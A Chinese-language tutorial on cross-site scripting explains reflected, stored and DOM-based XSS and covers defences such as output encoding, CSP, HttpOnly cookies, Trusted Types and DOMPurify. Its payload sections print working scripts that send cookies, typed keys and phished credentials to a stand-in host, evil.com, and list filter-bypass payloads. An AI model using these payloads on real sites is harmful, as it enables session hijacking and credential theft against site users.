---
title: XSS攻击防护
description: "XSS 是一种代码注入攻击，攻击者将恶意脚本注入到受信任的网站中。当用户浏览该网站时，嵌入的恶意脚本会被执行，从而窃取用户信息或执行恶意操作。"
keywords: [XSS攻击防护]
category: JavaScript
tags: [JavaScript, ES6, 异步, DOM]
---


# XSS 攻击防护

> XSS（Cross-Site Scripting）跨站脚本攻击是最常见的 Web 安全漏洞，OWASP Top 10 中常年位居前列。

## 一、XSS 攻击概述

### 1.1 什么是 XSS

XSS 是一种代码注入攻击，攻击者将恶意脚本注入到受信任的网站中。当用户浏览该网站时，嵌入的恶意脚本会被执行，从而窃取用户信息或执行恶意操作。

### 1.2 XSS 攻击流程

```
┌─────────┐      注入恶意脚本      ┌─────────┐
│ 攻击者   │ ───────────────────→ │  服务器  │
└─────────┘                       └─────────┘
                                       │
                                       ↓ 存储或反射
                                  ┌─────────┐
                                  │  网页   │
                                  └─────────┘
                                       │
                                       ↓ 浏览器执行
┌─────────┐      执行恶意脚本      ┌─────────┐
│ 攻击者   │ ←─────────────────── │  用户    │
└─────────┘      窃取数据          └─────────┘
```

---

## 二、XSS 类型详解

### 2.1 反射型 XSS（Reflected XSS）

**特点**：恶意脚本通过 URL 参数传递，服务器将其反射回响应页面。

**攻击流程**：
```
1. 攻击者构造恶意 URL
2. 诱导用户点击链接
3. 服务器将恶意脚本反射回页面
4. 浏览器执行恶意脚本
```

**漏洞示例**：

```javascript
// 服务端代码（Node.js Express）
app.get('/search', (req, res) => {
  const query = req.query.q;
  // ❌ 危险：直接输出用户输入
  res.send(`<h1>搜索结果：${query}</h1>`);
});

// 攻击 URL
// https://example.com/search?q=<script>alert('XSS')</script>

// ✅ 安全：输出编码
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>搜索结果：${query}</h1>`);
});
```

**实际案例**：
```javascript
// 搜索页面漏洞
https://example.com/search?q=<img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">

// 错误页面漏洞
https://example.com/error?msg=<script>document.location='http://evil.com/'+document.cookie</script>
```

### 2.2 存储型 XSS（Stored XSS）

**特点**：恶意脚本永久存储在目标服务器上（数据库、文件系统等），每次浏览相关页面都会触发。

**攻击流程**：
```
1. 攻击者提交恶意内容
2. 服务器存储恶意脚本
3. 用户浏览包含恶意脚本的页面
4. 浏览器执行恶意脚本
```

**漏洞示例**：

```javascript
// 用户评论功能
// ❌ 危险：直接存储和显示
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  db.saveComment(comment); // 存储到数据库
});

app.get('/comments', (req, res) => {
  const comments = db.getComments();
  // 直接输出，未转义
  res.render('comments', { comments });
});

// ✅ 安全：输出前转义
app.get('/comments', (req, res) => {
  const comments = db.getComments().map(c => ({
    ...c,
    content: escapeHtml(c.content)
  }));
  res.render('comments', { comments });
});
```

**高风险场景**：
- 评论系统
- 用户资料
- 论坛帖子
- 消息系统
- 文件上传（SVG、HTML）

### 2.3 DOM 型 XSS（DOM-based XSS）

**特点**：攻击完全在浏览器端进行，恶意脚本通过操作 DOM 树注入。

**攻击流程**：
```
1. 攻击者构造恶意 URL
2. 前端 JavaScript 从 URL 读取数据
3. 不安全地操作 DOM
4. 恶意脚本执行
```

**漏洞示例**：

```javascript
// ❌ 危险：从 URL 读取并直接写入 DOM
document.write(location.hash.slice(1));

// ❌ 危险：使用 innerHTML
document.body.innerHTML = location.search.slice(1);

// ❌ 危险：jQuery 不安全方法
$('#output').html(location.hash);

// ✅ 安全：使用安全的 API
document.body.textContent = location.hash.slice(1);
$('#output').text(location.hash);

// ✅ 安全：输出编码
function safeRender(content) {
  const div = document.createElement('div');
  div.textContent = content;
  return div.innerHTML;
}
document.body.innerHTML = safeRender(location.hash.slice(1));
```

### 2.4 XSS 类型对比

| 类型 | 存储位置 | 触发方式 | 持久性 | 危害程度 | 防护难度 |
|------|---------|---------|--------|---------|---------|
| 反射型 | URL | 点击恶意链接 | 临时 | 中高 | 较易 |
| 存储型 | 服务器 | 浏览相关页面 | 永久 | 高 | 较易 |
| DOM型 | URL/DOM | 前端操作 | 临时 | 中高 | 较难 |

---

## 三、攻击载荷示例

### 3.1 窃取 Cookie

```html
<!-- 基础窃取 -->
<script>
  new Image().src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

<!-- 带完整信息 -->
<script>
  fetch('http://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      url: location.href,
      userAgent: navigator.userAgent
    })
  });
</script>
```

### 3.2 钓鱼攻击

```html
<!-- 替换登录表单 -->
<script>
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
      <h2>会话已过期，请重新登录</h2>
      <form action="http://evil.com/phish">
        <input name="username" placeholder="用户名"><br>
        <input name="password" type="password" placeholder="密码"><br>
        <button>登录</button>
      </form>
    </div>
  `;
</script>
```

### 3.3 键盘记录

```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('http://evil.com/keylog?key=' + e.key);
  });
</script>
```

### 3.4 蠕虫传播

```html
<!-- 在社交网站中自动发送包含 XSS 的消息 -->
<script>
  // 获取 CSRF Token
  const token = document.querySelector('meta[name="csrf-token"]').content;
  
  // 发送恶意消息给好友
  fetch('/api/send-message', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      to: 'all-friends',
      message: '<script>/* 复制自身代码 */</script>',
      _csrf: token
    })
  });
</script>
```

### 3.5 常见测试载荷

```html
<!-- 基础测试 -->
<script>alert(1)</script>
<script>alert(document.domain)</script>

<!-- 绕过过滤 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- 编码绕过 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<a href="javascript:alert(1)">click</a>
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>

<!-- 大小写混合 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- 闭合标签 -->
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- 绕过 CSP -->
<script src="data:text/javascript,alert(1)"></script>
<link rel="import" href="data:text/html,<script>alert(1)</script>">
```

---

## 四、防护措施详解

### 4.1 输出编码

#### HTML 实体编码

```javascript
/**
 * HTML 实体编码工具
 */
class HtmlEncoder {
  constructor() {
    this.entityMap = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '/': '&#x2F;'
    };
  }

  // HTML 正文编码
  encode(str) {
    return String(str).replace(/[&<>"'/]/g, (ch) => this.entityMap[ch]);
  }

  // HTML 属性编码
  encodeAttribute(str) {
    return this.encode(str);
  }

  // URL 参数编码
  encodeUrl(str) {
    return encodeURIComponent(str);
  }

  // JavaScript 字符串编码（需配合引号使用）
  encodeJs(str) {
    return String(str)
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/</g, '\\u003C')
      .replace(/>/g, '\\u003E');
  }

  // CSS 编码
  encodeCss(str) {
    return String(str).replace(/[^a-zA-Z0-9]/g, (ch) => '\\' + ch.charCodeAt(0).toString(16) + ' ');
  }
}

// 使用示例
const encoder = new HtmlEncoder();
const safeHtml = encoder.encode(userInput);
const safeAttr = encoder.encodeAttribute(userInput);
const safeUrl = encoder.encodeUrl(userInput);
const safeJs = encoder.encodeJs(userInput);
```

#### 根据上下文选择编码方式

```javascript
// HTML 上下文
<div>${encoder.encode(userInput)}</div>

// HTML 属性上下文
<div data-value="${encoder.encodeAttribute(userInput)}"></div>
<input value="${encoder.encodeAttribute(userInput)}">

// URL 参数上下文
<a href="/search?q=${encoder.encodeUrl(userInput)}">搜索</a>

// JavaScript 上下文
<script>
  var name = "${encoder.encodeJs(userInput)}";
</script>

// CSS 上下文
<style>
  .element::after { content: "${encoder.encodeCss(userInput)}"; }
</style>
```

### 4.2 使用安全的 API

```javascript
// ==================== 不安全的 API ====================

// ❌ innerHTML - 执行 HTML 和脚本
element.innerHTML = userInput;

// ❌ outerHTML - 执行 HTML 和脚本
element.outerHTML = userInput;

// ❌ document.write - 完全不安全
document.write(userInput);

// ❌ eval - 执行任意代码
eval(userInput);

// ✅ textContent - 仅作为纯文本处理
element.textContent = userInput;

// ✅ createTextNode - 创建文本节点
element.appendChild(document.createTextNode(userInput));

// ✅ jQuery text() - 等同于 textContent
$(element).text(userInput);
```

### 4.3 Content Security Policy（CSP）

```http
# 基础 CSP 配置
Content-Security-Policy: default-src 'self'

# 完整 CSP 配置
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'self';

# 报告模式（测试用）
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

**使用 nonce 处理内联脚本**：

```javascript
// 服务端生成 nonce
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');

// 设置 CSP 头
res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

// 模板中使用 nonce
res.render('page', { nonce });
```

```html
<!-- HTML 模板 -->
<script nonce="<%= nonce %>">
  console.log('安全的内联脚本');
</script>
```

### 4.4 HttpOnly 和 Secure Cookie

```http
# 服务端设置安全 Cookie
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/

# Node.js Express 示例
res.cookie('session', token, {
  httpOnly: true,      # JavaScript 无法读取
  secure: true,        # 仅 HTTPS 传输
  sameSite: 'strict',  # 防止 CSRF
  maxAge: 3600000,     # 1 小时过期
  path: '/'
});
```

### 4.5 输入验证和过滤

```javascript
/**
 * 输入验证和过滤工具
 */
class InputFilter {
  /**
   * 白名单验证
   */
  static validate(value, pattern) {
    if (!pattern.test(value)) {
      throw new Error('输入格式无效');
    }
    return value;
  }

  /**
   * 移除危险标签
   */
  static stripTags(str) {
    return String(str).replace(/<[^>]*>/g, '');
  }

  /**
   * 移除事件属性（on*）
   */
  static stripEvents(str) {
    return String(str).replace(/\son\w+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)/gi, '');
  }

  /**
   * HTML 实体编码
   */
  static escapeHtml(str) {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
    return String(str).replace(/[&<>"']/g, (ch) => map[ch]);
  }

  /**
   * 过滤并编码
   */
  static sanitize(str) {
    return this.escapeHtml(this.stripTags(str));
  }
}

// 使用示例
const username = InputFilter.validate(userInput, /^[a-zA-Z0-9_]{3,20}$/);
const safeComment = InputFilter.sanitize(commentInput);
```

### 4.6 Trusted Types（现代浏览器）

Trusted Types API 是防止 DOM 型 XSS 的重要安全机制，它要求所有危险的 DOM Sink（如 `innerHTML`、`eval()`）只能接受经过安全处理的特殊类型，而非普通字符串：

```javascript
// ❌ 不安全：直接使用字符串（会被 Trusted Types 阻止）
element.innerHTML = userInput // TypeError: Failed to set the 'innerHTML' property

// ✅ 安全：通过 Trusted Types 策略创建安全内容
const escapePolicy = trustedTypes.createPolicy('escape-policy', {
  createHTML: (input) => {
    return input
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
  }
})

element.innerHTML = escapePolicy.createHTML(userInput) // ✅ 允许

// ✅ 使用 DOMPurify 策略
const sanitizePolicy = trustedTypes.createPolicy('sanitize-policy', {
  createHTML: (input) => DOMPurify.sanitize(input)
})

element.innerHTML = sanitizePolicy.createHTML(userInput) // ✅ 允许
```

**CSP 配置启用 Trusted Types：**

```http
# 报告模式（推荐先使用此模式测试）
Content-Security-Policy: require-trusted-types-for 'script'; report-uri /csp-report

# 强制模式
Content-Security-Policy: trusted-types escape-policy sanitize-policy; require-trusted-types-for 'script'
```

**Trusted Types 保护的 DOM Sink：**

| DOM Sink | 危险操作 | Trusted Types 要求 |
|----------|---------|-------------------|
| `element.innerHTML` | 插入 HTML | 需要 `createHTML()` |
| `document.write()` | 写入文档 | 需要 `createHTML()` |
| `eval()` | 执行代码 | 需要 `createScript()` |
| `script.src` | 加载脚本 | 需要 `createScriptURL()` |
| `setTimeout(string)` | 定时执行 | 需要 `createScript()` |

### 4.7 Permissions API

Permissions API 提供了统一的方式来查询和监听浏览器权限状态：

```javascript
// 查询权限状态
const status = await navigator.permissions.query({ name: "geolocation" })
console.log(status.state) // "granted" | "denied" | "prompt"

// 监听权限变化
status.addEventListener("change", () => {
  console.log("权限状态变更:", status.state)
})

// 常用权限查询
const permissions = [
  { name: "geolocation" },
  { name: "notifications" },
  { name: "camera" },
  { name: "microphone" },
  { name: "clipboard-read" },
  { name: "clipboard-write" },
  { name: "persistent-storage" }
]

for (const perm of permissions) {
  const result = await navigator.permissions.query(perm)
  console.log(`${perm.name}: ${result.state}`)
}
```

---

## 五、框架层面的防护

### 5.1 React

```jsx
// React 默认转义 HTML
function SafeComponent({ userInput }) {
  // ✅ 安全：React 自动转义
  return <div>{userInput}</div>;
}

// ❌ 危险：dangerouslySetInnerHTML
function DangerousComponent({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
}

// ✅ 安全：配合 DOMPurify 使用
import DOMPurify from 'dompurify';

function SanitizedComponent({ richText }) {
  const sanitized = DOMPurify.sanitize(richText, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href']
  });
  return (
    <div
      className="rich-text"
      dangerouslySetInnerHTML={{ __html: sanitized }}
    />
  );
}
```

### 5.2 Vue

```vue
<template>
  <!-- ✅ 安全：Vue 自动转义 -->
  <div>{{ userInput }}</div>
  
  <!-- ❌ 危险：v-html -->
  <div v-html="userInput"></div>
  
  <!-- ✅ 安全：配合 DOMPurify -->
  <div v-html="sanitizedHtml"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  props: ['userInput'],
  computed: {
    sanitizedHtml() {
      return DOMPurify.sanitize(this.userInput, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
        ALLOWED_ATTR: []
      });
    }
  }
};
</script>
```

### 5.3 Angular

```typescript
// Angular 默认转义 HTML
@Component({
  template: `
    <!-- ✅ 安全：Angular 自动转义 -->
    <div>{{ userInput }}</div>
    
    <!-- ❌ 危险：[innerHTML] -->
    <div [innerHTML]="userInput"></div>
    
    <!-- ✅ 安全：使用 DomSanitizer -->
    <div [innerHTML]="sanitizedHtml"></div>
  `
})
export class SafeComponent {
  @Input() userInput: string;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  get sanitizedHtml(): SafeHtml {
    return this.sanitizer.bypassSecurityTrustHtml(
      DOMPurify.sanitize(this.userInput)
    );
  }
}
```

---

## 六、XSS 检测与测试

### 6.1 自动化检测工具

| 工具 | 类型 | 特点 | 适用场景 |
|------|------|------|---------|
| OWASP ZAP | 开源 | 全面扫描、自动化测试 | 渗透测试 |
| Burp Suite | 商业 | 专业级渗透测试工具 | 安全审计 |
| XSSer | 开源 | 专门的 XSS 扫描器 | XSS 检测 |
| Arachni | 开源 | Web 漏洞扫描框架 | CI/CD 集成 |

### 6.2 手动测试方法

```javascript
// XSS 测试载荷集合
const xssPayloads = [
  // 基础测试
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  
  // 事件处理器
  '<div onmouseover="alert(1)">',
  '<input onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">',

  // 编码绕过
  '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
  '<a href="javascript:alert(1)">click</a>'
];

// 对多个入口批量测试
async function scanEndpoints(endpoints) {
  const results = [];
  for (const endpoint of endpoints) {
    for (const payload of xssPayloads) {
      const result = await testPayload(endpoint, payload);
      results.push(result);
    }
  }

  return results;
}
```

### 6.3 浏览器检测

```javascript
// 检测 XSS 过滤器
function detectXSSFilter() {
  const features = {
    xssFilter: false,
    csp: false,
    xssProtection: false
  };
  
  // 检查 CSP
  const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  features.csp = !!csp;
  
  // 检查安全头（需要服务端配合）
  // ...
  
  return features;
}

// XSS 漏洞检测报告
function generateSecurityReport() {
  return {
    url: location.href,
    cookies: document.cookie.split(';').length,
    localStorage: Object.keys(localStorage).length,
    sessionStorage: Object.keys(sessionStorage).length,
    features: detectXSSFilter(),
    timestamp: new Date().toISOString()
  };
}
```

---

## 七、实际案例分析

### 7.1 案例：评论系统 XSS

**漏洞代码**：

```javascript
// 服务端 - 不安全的评论处理
app.post('/api/comment', (req, res) => {
  const { content, userId } = req.body;
  
  // 直接存储，未净化
  db.query(
    'INSERT INTO comments (user_id, content) VALUES (?, ?)',
    [userId, content]
  );
  
  res.json({ success: true });
});

// 前端 - 不安全的显示
function renderComments(comments) {
  const html = comments.map(c => `
    <div class="comment">
      <p>${c.content}</p>
      <span>${c.username}</span>
    </div>
  `).join('');
  
  document.getElementById('comments').innerHTML = html;
}
```

**修复方案**：

```javascript
import DOMPurify from 'dompurify';

// 服务端 - 存储前净化
app.post('/api/comment', (req, res) => {
  const { content, userId } = req.body;

  // 净化内容
  const cleanContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href', 'title']
  });

  db.saveComment(cleanContent);
  res.json({ success: true });
});

// 前端 - 安全显示（避免 innerHTML 拼接）
function renderComments(comments) {
  const container = document.getElementById('comments');
  container.textContent = '';

  comments.forEach(c => {
    const div = document.createElement('div');
    div.className = 'comment';
    const p = document.createElement('p');
    p.textContent = c.content;
    const span = document.createElement('span');
    span.textContent = c.username;
    div.appendChild(p);
    div.appendChild(span);
    container.appendChild(div);
  });
}
```

### 7.2 案例：URL 参数 XSS

**漏洞代码**：

```javascript
// 从 URL 获取搜索关键词并显示
function showSearchResult() {
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('result').innerHTML = `搜索：${query}`;
}

// 攻击 URL
// https://example.com/search?q=<img src=x onerror=alert(1)>
```

**修复方案**：

```javascript
function showSearchResult() {
  const query = new URLSearchParams(location.search).get('q');
  
  // 方案1：使用 textContent
  document.getElementById('result').textContent = `搜索：${query}`;
  
  // 方案2：输出编码
  const encoded = encoder.encode(query);
  document.getElementById('result').innerHTML = `搜索：${encoded}`;
  
  // 方案3：创建文本节点
  const result = document.getElementById('result');
  result.textContent = '';
  result.appendChild(document.createTextNode(`搜索：${query}`));
}
```

---

## 八、常见问题解答（FAQ）

### Q1: 如何处理富文本编辑器的 XSS 问题？

**回答**：使用专业的 HTML 净化库，如 DOMPurify。

```javascript
import DOMPurify from 'dompurify';

// 配置允许的标签和属性
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li', 'img'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
  ALLOW_DATA_ATTR: false,
  ADD_ATTR: ['target'],  // 允许 target 属性
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick']
});

// 使用
element.innerHTML = clean;
```

### Q2: XSS 防护是否只需要前端处理？

**回答**：不是。XSS 防护需要前后端配合：

- **前端**：输出编码、使用安全 API、CSP 策略
- **后端**：输入验证、输出编码、安全存储、安全头配置

**多层防护才能确保安全**。

### Q3: HttpOnly 能完全防止 XSS 攻击吗？

**回答**：不能。HttpOnly 只能防止 JavaScript 读取 Cookie，但攻击者仍可以：
- 获取页面内容
- 监听键盘输入
- 发起恶意请求
- 修改页面内容

**建议**：HttpOnly 应与其他防护措施配合使用。

### Q4: 如何在 CSP 中处理内联脚本？

**回答**：推荐使用 nonce 或 hash 方式：

```http
# nonce 方式（推荐）
Content-Security-Policy: script-src 'self' 'nonce-abc123'

# hash 方式
Content-Security-Policy: script-src 'self' 'sha256-xxx'
```

```html
<!-- nonce 方式 -->
<script nonce="abc123">
  console.log('安全');
</script>
```

**避免使用 `'unsafe-inline'`**，这会大幅降低 CSP 的防护效果。

### Q5: 如何测试网站是否存在 XSS 漏洞？

**回答**：可以采用以下方法：

1. **手动测试**：在输入框、URL 参数等位置注入测试载荷
2. **自动化扫描**：使用 OWASP ZAP、Burp Suite 等工具
3. **代码审计**：检查是否存在不安全的 innerHTML、eval 等调用
4. **渗透测试**：邀请专业安全团队进行测试

### Q6: 为什么说存储型 XSS 危害最大？

**回答**：存储型 XSS 的特点：
- **持久性**：恶意脚本永久存储在服务器
- **广泛性**：所有浏览该页面的用户都会被攻击
- **隐蔽性**：不需要诱导用户点击恶意链接
- **持久影响**：直到被发现和修复前持续有效

### Q7: 如何防护 DOM 型 XSS？

**回答**：DOM 型 XSS 完全在前端发生，防护要点：

```javascript
// 1. 避免使用危险 API
// ❌ document.write()
// ❌ element.innerHTML
// ❌ eval()

// 2. 使用安全的 API
// ✅ element.textContent
// ✅ element.innerText

// 3. 对动态内容进行编码
function safeRender(content) {
  const div = document.createElement('div');
  div.textContent = content;
  return div.innerHTML;
}

// 4. 严格验证 URL 来源
const allowedOrigins = ['https://example.com'];
function isAllowedOrigin(url) {
  try {
    const { origin } = new URL(url, location.origin);
    return allowedOrigins.includes(origin);
  } catch {
    return false;
  }
}
```

---

## 九、最佳实践清单

### 开发阶段
- [ ] 所有用户输入都经过验证和编码
- [ ] 使用 textContent/innerText 替代 innerHTML
- [ ] 富文本使用 DOMPurify 进行净化
- [ ] 避免使用 eval、new Function 等危险 API
- [ ] 对 URL 参数进行严格验证

### 测试阶段
- [ ] 进行 XSS 漏洞扫描
- [ ] 使用多种测试载荷进行渗透测试
- [ ] 测试各种输入场景（URL、表单、API 等）
- [ ] 验证 CSP 策略有效性

### 部署阶段
- [ ] 配置 Content-Security-Policy 头
- [ ] 设置 HttpOnly 和 Secure Cookie 属性
- [ ] 配置 X-XSS-Protection: 0（现代浏览器已移除 XSS 审计器）
- [ ] 启用 XSS 漏洞报告机制

---

## 十、参考资料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [Content Security Policy Reference](https://content-security-policy.com/)
- [PortSwigger XSS Guide](https://portswigger.net/web-security/cross-site-scripting)

---

> 💡 **提示**：永远不要信任用户输入，始终进行输出编码。XSS 防护是一个多层次的过程，需要前后端配合，结合 CSP、输入验证、输出编码等多种手段。
